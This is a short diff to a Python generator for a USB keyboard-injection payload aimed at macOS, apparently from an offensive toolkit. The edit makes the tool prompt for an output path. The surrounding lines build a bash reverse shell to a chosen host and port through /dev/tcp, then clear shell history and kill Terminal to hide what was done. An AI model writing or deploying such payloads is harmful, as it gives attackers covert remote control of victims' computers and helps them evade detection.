@@ -37,11 +37,13 @@ class payload:
 				shell_command = shell+" &> /dev/tcp/"+str(server.host)+"/"+str(server.port)+" 0>&1;"
 				break
 		shell_command += "history -wc;killall Terminal"
-		if os.path.exists("payloads") == False:
-			os.mkdir("payloads")
-		if os.path.exists("payloads/teensy_macos") == False:
-			os.mkdir("payloads/teensy_macos")
-		payload_save_path = "payloads/arduino_macos/arduino_macos.ino"
+		path = raw_input(h.info_general_raw("Output File: ")).strip(" ")
+		direct = os.path.split(path)[0]
+		if os.path.exists(direct):
+			payload_save_path = path
+		else:
+			h.info_error("Local directory: "+direct+": does not exist!")
+			exit
 		payload = """\
 #include "Keyboard.h"
 
